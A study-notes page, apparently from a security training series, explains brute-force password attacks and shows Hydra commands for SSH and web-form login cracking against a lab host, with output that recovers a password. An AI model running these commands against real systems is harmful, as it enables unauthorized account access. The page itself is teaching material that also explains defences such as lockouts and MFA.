# Day 18 — Password Attacks (Bruteforce Attacks with Hydra)
[← Back to overview](README.md)

## What Are Bruteforce Attacks?
A brute force attack is a trial-and-error method used to decode sensitive data by systematically trying all possible
combinations of passwords or encryption keys until the correct one is found.

## Types of Password Attacks
- **Simple brute force attacks** — trying all possible character combinations.
- **Dictionary attacks** — using common words and phrases (wordlists) instead of every possible combination.
- **Hybrid attacks** — combining brute force with dictionary methods (e.g. appending numbers/symbols to dictionary words).
- **Credential stuffing** — using exposed username/password pairs from previous data breaches against a new target.

## Meet Hydra
Hydra is a fast, parallelized network login cracker supporting a huge range of protocols.

```bash
hydra
```
```
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS]
              [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET]
              [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
```

| Flag | Meaning |
|---|---|
| `-l LOGIN` / `-L FILE` | Login with a single username, or load several usernames from a file. |
| `-p PASS` / `-P FILE` | Try a single password, or load several passwords from a file. |
| `-C FILE` | Colon-separated `login:pass` format, instead of `-L`/`-P`. |
| `-M FILE` | List of servers to attack, one per line. |
| `-t TASKS` | Number of parallel connections per target (default: 16). |
| `-U` | Service module usage details. |
| `-m OPT` | Options specific to a module. |
| `server` | Target: DNS name, IP, or CIDR range. |
| `service` | The protocol/service to attack. |

**Supported services** span a huge list, including: `ftp`, `ssh`, `telnet`, `smtp`, `http[s]`, `http[s]-{head|get|post}`,
`http[s]-{get|post}-form`, `rdp`, `smb`, `mysql`, `mssql`, `postgres`, `vnc`, `snmp`, `pop3[s]`, `imap[s]`, and dozens more.

## Practice — SSH Bruteforce
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.217.225
```
```
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.217.225:22/
[22][ssh] host: 10.10.217.225   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```
A known username (`molly`) tested against every password in the classic **rockyou.txt** wordlist — cracked in seconds,
recovering the password `butterfly`.

## Practice — HTTP POST Form Bruteforce
Web login forms need Hydra's `http-post-form` module, which requires the exact POST path, field names, and a string
that identifies a *failed* login attempt:
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.217.225 \
  http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect" -v
```
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.217.225:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://10.10.217.225:80/login
[VERBOSE] Page redirected to http[s]://10.10.217.225:80/login
...
```
The `^USER^` and `^PASS^` placeholders get substituted with each candidate credential, and Hydra compares the response
against the failure string to decide pass/fail — a technique that generalizes to virtually any login form once the
right failure indicator is identified.

## Why It Matters
Bruteforce attacks are the blunt instrument of password security testing — no cleverness required, just raw attempts
against weak or reused credentials. `molly:butterfly` succeeding against SSH in seconds is a direct illustration of
why password policies (length, complexity, rotation, MFA) and account lockout thresholds exist: without them, a
single wordlist and a fast tool is often all it takes.

## 🧠 Quick Revision Questions
1. Why does the `http-post-form` module need a *failure string* rather than a *success string*?
2. Why would an assessor reduce `-t` (tasks) when attacking SSH specifically?
3. What's the practical difference between a dictionary attack and credential stuffing?

## 🔑 New Glossary Terms
- **Hydra** — a parallelized, multi-protocol network login cracker.
- **rockyou.txt** — a widely used wordlist of real-world leaked passwords, bundled with Kali.
- **Credential Stuffing** — reusing breached username/password pairs against other services.
- **Account Lockout** — a defensive control that locks an account after repeated failed login attempts.

---
[← Day 17](day17.md) | [Back to overview](README.md) | [Next: Day 19 →](day19.md)
